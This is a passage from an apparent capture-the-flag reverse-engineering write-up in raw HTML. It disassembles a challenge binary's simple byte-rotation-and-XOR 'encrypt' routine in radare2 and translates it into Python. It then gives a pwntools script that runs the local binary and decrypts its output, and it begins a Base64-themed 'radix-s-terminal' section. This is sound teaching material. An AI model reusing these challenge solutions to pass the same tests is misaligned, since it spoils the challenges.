</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x080486a7</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">s</span> <span style="color:#8be9fd;font-style:italic">sym.encrypt</span>
[0<span style="color:#50fa7b">x0804867f</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pdf</span>
            <span style="color:#6272a4">; CALL XREF from fcn.08048700 @ 0x8048735</span>
            <span style="color:#6272a4">;-- sym.encrypt:</span>
/ 119: <span style="color:#50fa7b">fcn.0804867f</span> (<span style="color:#8be9fd;font-style:italic">int32_t</span> <span style="color:#8be9fd;font-style:italic">plaintext</span>)<span style="color:#6272a4">;</span>
|           <span style="color:#6272a4">; var int32_t ch @ ebp-0x11</span>
|           <span style="color:#6272a4">; var int32_t i @ ebp-0x10</span>
|           <span style="color:#6272a4">; var signed int var_ch  { &lt; 0xffffffffffffffff} @ ebp-0xc</span>
|           <span style="color:#6272a4">; arg int32_t plaintext @ ebp+0x8</span>
|           0<span style="color:#50fa7b">x0804867f</span>      <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">ebp</span>
|           0<span style="color:#50fa7b">x08048680</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">e5</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">ebp</span>, <span style="color:#8be9fd;font-style:italic">esp</span>
|           0<span style="color:#50fa7b">x08048682</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec18</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x18</span>
|           0<span style="color:#50fa7b">x08048685</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec0c</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0xc</span>
|           0<span style="color:#50fa7b">x08048688</span>      <span style="color:#8be9fd;font-style:italic">ff7508</span>         <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">plaintext</span>]
|           0<span style="color:#50fa7b">x0804868b</span>      <span style="color:#8be9fd;font-style:italic">e880fdffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.imp.strlen</span>
|           0<span style="color:#50fa7b">x08048690</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c410</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x10</span>
|           0<span style="color:#50fa7b">x08048693</span>      <span style="color:#bd93f9">8945</span><span style="color:#8be9fd;font-style:italic">f4</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_ch</span>], <span style="color:#8be9fd;font-style:italic">eax</span>     <span style="color:#6272a4">; varc = len(plaintext)</span>
|           0<span style="color:#50fa7b">x08048696</span>      <span style="color:#8be9fd;font-style:italic">c745f0000000.</span>  <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">i</span>], <span style="color:#bd93f9">0</span>            <span style="color:#6272a4">; i = 0</span>
|       ,=&lt; 0<span style="color:#50fa7b">x0804869d</span>      <span style="color:#8be9fd;font-style:italic">eb4a</span>           <span style="color:#8be9fd;font-style:italic">jmp</span> <span style="color:#bd93f9">0x80486e9</span>               <span style="color:#6272a4">; while(i &lt; len(plaintext)) {</span>
|       |   <span style="color:#6272a4">; CODE XREF from fcn.0804867f @ 0x80486ef</span>
|      <span style="color:#50fa7b">.</span><span style="color:#ff79c6">--&gt;</span> <span style="color:#bd93f9">0x0804869f</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b55f0</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edx</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">i</span>]
|      :|   0<span style="color:#50fa7b">x080486a2</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b4508</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">plaintext</span>]
|      :|   0<span style="color:#50fa7b">x080486a5</span>      <span style="color:#bd93f9">01</span><span style="color:#8be9fd;font-style:italic">d0</span>           <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd;font-style:italic">edx</span>                <span style="color:#6272a4">; eax is an address pointing to plaintext[i]</span>
|      :|   0<span style="color:#50fa7b">x080486a7</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fb600</span>         <span style="color:#8be9fd;font-style:italic">movzx</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">eax</span>]       <span style="color:#6272a4">; eax = plaintext[i]</span>
|      :|   0<span style="color:#50fa7b">x080486aa</span>      <span style="color:#bd93f9">8845</span><span style="color:#8be9fd;font-style:italic">ef</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">ch</span>], <span style="color:#8be9fd;font-style:italic">al</span>           <span style="color:#6272a4">; ch = plaintext[i]</span>
|      :|   0<span style="color:#50fa7b">x080486ad</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fbe45ef</span>       <span style="color:#8be9fd;font-style:italic">movsx</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">ch</span>]
|      :|   0<span style="color:#50fa7b">x080486b1</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec0c</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0xc</span>
|      :|   0<span style="color:#50fa7b">x080486b4</span>      <span style="color:#bd93f9">50</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">eax</span>
|      :|   0<span style="color:#50fa7b">x080486b5</span>      <span style="color:#8be9fd;font-style:italic">e817ffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.rol4</span>
|      :|   0<span style="color:#50fa7b">x080486ba</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c410</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x10</span>
|      :|   0<span style="color:#50fa7b">x080486bd</span>      <span style="color:#bd93f9">8845</span><span style="color:#8be9fd;font-style:italic">ef</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">ch</span>], <span style="color:#8be9fd;font-style:italic">al</span>           <span style="color:#6272a4">; ch = rol4(ch)</span>
|      :|   0<span style="color:#50fa7b">x080486c0</span>      <span style="color:#bd93f9">8075</span><span style="color:#8be9fd;font-style:italic">ef16</span>       <span style="color:#8be9fd;font-style:italic">xor</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">ch</span>], <span style="color:#bd93f9">0x16</span>         <span style="color:#6272a4">; [0x16:1]=255 ; 22 ; ch = ch ^ 0x16</span>
|      :|   0<span style="color:#50fa7b">x080486c4</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fbe45ef</span>       <span style="color:#8be9fd;font-style:italic">movsx</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">ch</span>]
|      :|   0<span style="color:#50fa7b">x080486c8</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec0c</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0xc</span>
|      :|   0<span style="color:#50fa7b">x080486cb</span>      <span style="color:#bd93f9">50</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">eax</span>
|      :|   0<span style="color:#50fa7b">x080486cc</span>      <span style="color:#8be9fd;font-style:italic">e827ffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.ror8</span>
|      :|   0<span style="color:#50fa7b">x080486d1</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c410</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x10</span>
|      :|   0<span style="color:#50fa7b">x080486d4</span>      <span style="color:#bd93f9">8845</span><span style="color:#8be9fd;font-style:italic">ef</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">ch</span>], <span style="color:#8be9fd;font-style:italic">al</span>           <span style="color:#6272a4">; ch = ror8(ch)</span>
|      :|   0<span style="color:#50fa7b">x080486d7</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b55f0</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edx</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">i</span>]
|      :|   0<span style="color:#50fa7b">x080486da</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b4508</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">plaintext</span>]
|      :|   0<span style="color:#50fa7b">x080486dd</span>      <span style="color:#bd93f9">01</span><span style="color:#8be9fd;font-style:italic">c2</span>           <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">edx</span>, <span style="color:#8be9fd;font-style:italic">eax</span>
|      :|   0<span style="color:#50fa7b">x080486df</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fb645ef</span>       <span style="color:#8be9fd;font-style:italic">movzx</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">ch</span>]        <span style="color:#6272a4">; plaintext[i] = ch</span>
|      :|   0<span style="color:#50fa7b">x080486e3</span>      <span style="color:#bd93f9">8802</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">edx</span>], <span style="color:#8be9fd;font-style:italic">al</span>
|      :|   0<span style="color:#50fa7b">x080486e5</span>      <span style="color:#bd93f9">8345</span><span style="color:#8be9fd;font-style:italic">f001</span>       <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">i</span>], <span style="color:#bd93f9">1</span>            <span style="color:#6272a4">; i += 1</span>
|      :|   <span style="color:#6272a4">; CODE XREF from fcn.0804867f @ 0x804869d</span>
|      :`-&gt; 0<span style="color:#50fa7b">x080486e9</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45f0</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">i</span>]          <span style="color:#6272a4">; } /* while */</span>
|      :    0<span style="color:#50fa7b">x080486ec</span>      <span style="color:#bd93f9">3</span><span style="color:#8be9fd;font-style:italic">b45f4</span>         <span style="color:#8be9fd;font-style:italic">cmp</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_ch</span>]     <span style="color:#6272a4">; /* while */</span>
|      `==&lt; 0<span style="color:#50fa7b">x080486ef</span>      <span style="color:#bd93f9">7</span><span style="color:#8be9fd;font-style:italic">cae</span>           <span style="color:#8be9fd;font-style:italic">jl</span> <span style="color:#bd93f9">0x804869f</span>                <span style="color:#6272a4">; /* while */</span>
|           0<span style="color:#50fa7b">x080486f1</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45f4</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_ch</span>]
|           0<span style="color:#50fa7b">x080486f4</span>      <span style="color:#8be9fd;font-style:italic">c9</span>             <span style="color:#8be9fd;font-style:italic">leave</span>
\           0<span style="color:#50fa7b">x080486f5</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
[0<span style="color:#50fa7b">x0804867f</span>]<span style="color:#ff79c6">&gt;</span>
[0<span style="color:#50fa7b">x0804867f</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pdf</span> @ <span style="color:#8be9fd;font-style:italic">sym.rol4</span>
            <span style="color:#6272a4">; CALL XREF from sym.encrypt @ 0x80486b5</span>
/ 39: <span style="color:#50fa7b">sym.rol4</span> (<span style="color:#8be9fd;font-style:italic">int32_t</span> <span style="color:#8be9fd;font-style:italic">arg_8h</span>)<span style="color:#6272a4">;</span>
|           <span style="color:#6272a4">; var int32_t var_14h @ ebp-0x14</span>
|           <span style="color:#6272a4">; var int32_t var_1h @ ebp-0x1</span>
|           <span style="color:#6272a4">; arg int32_t arg_8h @ ebp+0x8</span>
|           0<span style="color:#50fa7b">x080485d1</span>      <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">ebp</span>
|           0<span style="color:#50fa7b">x080485d2</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">e5</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">ebp</span>, <span style="color:#8be9fd;font-style:italic">esp</span>
|           0<span style="color:#50fa7b">x080485d4</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec14</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x14</span>
|           0<span style="color:#50fa7b">x080485d7</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b4508</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">arg_8h</span>]
|           0<span style="color:#50fa7b">x080485da</span>      <span style="color:#bd93f9">8845</span><span style="color:#8be9fd;font-style:italic">ec</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">var_14h</span>], <span style="color:#8be9fd;font-style:italic">al</span>
|           0<span style="color:#50fa7b">x080485dd</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fb645ec</span>       <span style="color:#8be9fd;font-style:italic">movzx</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">var_14h</span>]
|           0<span style="color:#50fa7b">x080485e1</span>      <span style="color:#bd93f9">8845</span><span style="color:#8be9fd;font-style:italic">ff</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">var_1h</span>], <span style="color:#8be9fd;font-style:italic">al</span>
|           0<span style="color:#50fa7b">x080485e4</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fb655ec</span>       <span style="color:#8be9fd;font-style:italic">movzx</span> <span style="color:#8be9fd;font-style:italic">edx</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">var_14h</span>]
|           0<span style="color:#50fa7b">x080485e8</span>      <span style="color:#bd93f9">88</span><span style="color:#8be9fd;font-style:italic">d0</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">al</span>, <span style="color:#8be9fd;font-style:italic">dl</span>
|           0<span style="color:#50fa7b">x080485ea</span>      <span style="color:#8be9fd;font-style:italic">c0c004</span>         <span style="color:#8be9fd;font-style:italic">rol</span> <span style="color:#8be9fd;font-style:italic">al</span>, <span style="color:#bd93f9">4</span>
|           0<span style="color:#50fa7b">x080485ed</span>      <span style="color:#bd93f9">88</span><span style="color:#8be9fd;font-style:italic">c2</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">dl</span>, <span style="color:#8be9fd;font-style:italic">al</span>
|           0<span style="color:#50fa7b">x080485ef</span>      <span style="color:#bd93f9">8855</span><span style="color:#8be9fd;font-style:italic">ff</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">var_1h</span>], <span style="color:#8be9fd;font-style:italic">dl</span>
|           0<span style="color:#50fa7b">x080485f2</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fb645ff</span>       <span style="color:#8be9fd;font-style:italic">movzx</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">var_1h</span>]
|           0<span style="color:#50fa7b">x080485f6</span>      <span style="color:#8be9fd;font-style:italic">c9</span>             <span style="color:#8be9fd;font-style:italic">leave</span>
\           0<span style="color:#50fa7b">x080485f7</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>The <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/rol">rol</a> and <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/ror">ror</a> instructions are similar to <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/shl">shl</a> and <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/shr">shr</a> except the shifted bits are rotated to the other end.</p>
<p>Also, the rotation is on AL which is 1 byte size; therefore the rotation is on 8 bits</p>
<p>The <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/mov">movzx</a> instruction at address 0x080485f2 loads unsigned 8-bit value into 32-bit register eax and zero-extend</p>
<p>Hence, we can translate into python:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encrypt</span>(plaintext):
    ciphertext <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(plaintext)):
        ch <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(plaintext[i])		<span style="color:#6272a4">#we want the int representation of the char</span>
        ch <span style="color:#ff79c6">=</span> rol(ch, <span style="color:#bd93f9">4</span>, word_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8</span>)	<span style="color:#6272a4">#left shift on a Byte (size=8) see sym.rol4 in radare2</span>
        ch <span style="color:#ff79c6">=</span> ch <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x16</span>
        ch <span style="color:#ff79c6">=</span> ror(ch, <span style="color:#bd93f9">8</span>, word_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8</span>)  <span style="color:#6272a4">#right shift on a Byte (size=8) see sym.ror8 in radare2</span>
        ciphertext <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(ch)
    <span style="color:#ff79c6">return</span> ciphertext
</code></pre></td></tr></table>
</div>
</div><p>However we want to decrypt, so based on the above encrypt function we deduct the decryption code below:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> ror, rol, process, unhex
<span style="color:#ff79c6">import</span> re

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt</span>(ciphertext):
    plaintext <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(ciphertext)):
        ch <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(ciphertext[i])
        ch <span style="color:#ff79c6">=</span> rol(ch, <span style="color:#bd93f9">8</span>, word_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8</span>)
        ch <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x16</span>
        ch <span style="color:#ff79c6">=</span> ror(ch, <span style="color:#bd93f9">4</span>, word_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8</span>)
        plaintext <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(ch)
    <span style="color:#ff79c6">return</span> plaintext

s <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./main&#39;</span>)
prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;&#39;</span>)
prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvall()
cipher <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;quack it! : (.*)&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]

<span style="color:#8be9fd;font-style:italic">print</span> decrypt(unhex(cipher<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39; &#39;</span>,<span style="color:#f1fa8c">&#39;&#39;</span>)))
</code></pre></td></tr></table>
</div>
</div><h2 id="radix-s-terminal">radix-s-terminal</h2>
<ul>
<li><a href="./resources/radix-s-terminal/radix">radix</a></li>
</ul>
<p>The Hint is <a href="https://en.wikipedia.org/wiki/Base64">Base64</a> so it is reasonnable to believe the password or the flag is Base64 encoded.</p>
<p>Lookin at Base64 strings is easy:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
